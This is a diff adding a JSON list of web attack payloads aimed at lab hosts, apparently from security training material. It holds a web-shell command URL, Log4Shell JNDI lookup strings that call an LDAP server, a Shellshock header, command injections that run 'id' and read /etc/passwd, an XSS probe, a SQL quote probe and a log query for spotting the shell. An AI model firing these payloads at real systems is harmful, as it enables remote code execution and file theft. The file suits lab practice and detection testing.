@@ -1,0 +1,42 @@
+[
+  {
+    "file": "B07-01-file.txt",
+    "text": "http://192.168.0.189/uploads/book07-shell.php?cmd=id"
+  },
+  {
+    "file": "B07-02-jndi-agent.txt",
+    "text": "${jndi:ldap://192.168.0.202:1389/a}"
+  },
+  {
+    "file": "B07-03-jndi-url.txt",
+    "text": "http://dvwa.kt66.lab/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.202%3A1389%2Fa%7D"
+  },
+  {
+    "file": "B07-04-shellshock-agent.txt",
+    "text": "() { :; }; /bin/bash -c \"id\""
+  },
+  {
+    "file": "B07-05-shellshock-url.txt",
+    "text": "http://juice.kt66.lab/cgi-bin/test.cgi"
+  },
+  {
+    "file": "B07-06-command-input.txt",
+    "text": "127.0.0.1; id"
+  },
+  {
+    "file": "B07-07-command-url.txt",
+    "text": "http://dvwa.kt66.lab/vulnerabilities/exec/?ip=127.0.0.1%7Ccat%20/etc/passwd"
+  },
+  {
+    "file": "B07-08-ok-url.txt",
+    "text": "http://juice.kt66.lab/?q=%3Cscript%3Ealert(1)%3C/script%3E"
+  },
+  {
+    "file": "B07-09-error-url.txt",
+    "text": "http://juice.kt66.lab/rest/products/search?q=%27"
+  },
+  {
+    "file": "Q07-file-request.txt",
+    "text": "agent.name: \"web\"\nAND data.url: *book07-shell.php*"
+  }
+]
